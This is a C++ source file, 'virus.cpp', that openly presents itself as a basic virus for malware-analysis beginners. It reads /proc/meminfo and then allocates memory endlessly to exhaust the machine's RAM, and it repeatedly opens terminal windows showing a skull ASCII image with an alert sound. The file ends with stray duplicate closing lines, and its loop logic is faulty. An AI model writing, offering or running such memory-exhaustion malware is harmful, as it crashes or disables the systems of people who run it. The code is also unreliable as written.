
//============================================================================
// Name        : virus.cpp
// Author      : Ayanle
// Version     :
// Copyright   : free software
// Created Date : 06 May 2023
//============================================================================

#include <iostream>
#include <fstream>
#include <string>
#include <filesystem>

using namespace std;

/* different viruses have various agendas
 and aspects to harm a device
 some of them can harm your GPU and render your display useless
 some of them can format your files or operating system as a whole .
 even though these days such sabotagous malicious softwares
 are not common among cyber-criminals who already prefer using RAT , Spyware or ransomware
 for financial benefits but its quite reasonably helpfull for malware analysis newbies 
 to have concrete basics about viruses
*/

class Virus
{
public:
   inline void leak_memory(string path);
   friend inline void init_virus();
};


inline void Virus::leak_memory(string path)
{
   filesystem::path p;
   fstream strm;
   string str;
   char buffer;
   p = path;
   size_t total_memory;
   size_t free_memory;
   size_t used_memory;
   if(p.has_filename())
     {
      if(is_regular_file(p) and p.filename() == "meminfo")
      {
         strm.open(path , ios::in);
         std::cout << "is a regular file " << std::endl;
         while (!strm.eof()){
              buffer = strm.get();
              str.push_back(buffer);
        }
        total_memory = stoi(str.substr(15 , 9));
        free_memory = stoi(str.substr(40 , 16));
        used_memory = total_memory - free_memory;
       
        while(used_memory != total_memory
           or free_memory !=0)
              int* i = new int[200];
      }
      //if the memory details has not been found
      // try to just deliberatly overload the memory
       else{
        for(;;)
          int* i = new int[20];
         }  
      }
      else
         exit(0);
}


inline void init_virus()
{
   fstream strm;
   strm.open("skull.txt" , ios::out);
   strm << R"EOF(
                 uuuuuuu
             uu$$$$$$$$$$$uu
          uu$$$$$$$$$$$$$$$$$uu
         u$$$$$$$$$$$$$$$$$$$$$u
        u$$$$$$$$$$$$$$$$$$$$$$$u
       u$$$$$$$$$$$$$$$$$$$$$$$$$u
       u$$$$$$$$$$$$$$$$$$$$$$$$$u
       u$$$$$$     $$$     $$$$$$u
        $$$$       u$u       $$$$ 
        $$$u       u$u       u$$$
        $$$u      u$$$u      u$$$
          $$$$uu$$$   $$$uu$$$$
           $$$$$$$     $$$$$$$
            u$$$$$$$u$$$$$$$u
             u$ $ $ $ $ $ $u
  uuu        $$u$ $ $ $ $u$$       uuu
 u$$$$        $$$$$u$u$u$$$       u$$$$
  $$$$$uu       $$$$$$$$$      uu$$$$$$
u$$$$$$$$$$$uu    @@@@@    uuuu$$$$$$$$$$
$$$$  $$$$$$$$$$uuu   uu$$$$$$$$$$$$ $$$$
             $$$$$$$$$$$uu   $
           uuuu   $$$$$$$$$$uuu
  u$$$uuu$$$$$$$$$uu   $$$$$$$$$$$uuu$$$
  $$$$$$$$$$                 $$$$$$$$$$$
    $$$$$                         $$$$ 
     $$$                          $$$$)EOF" << endl;
     strm.close();
     // within this infinite loop lies the annoying death
     for(int i = 0;i<9;++i)
     {
        system(R"EOF(gnome-terminal -- bash -c "cat skull.txt; exec bash -i")EOF");
        system("paplay /usr/share/sounds/gnome/default/alerts/drip.ogg");
     }
}

int main(int argc , char ** argv)
{
  //instantiate the Virus class
  Virus virus;
  // the path of the linux file that contains the memory details
  std::string path = "/proc/meminfo";
 //leak the memory
  virus.leak_memory(path);
  //this function starts the annoying virus;
  init_virus();
 return 0;
}
  return 0;
}  
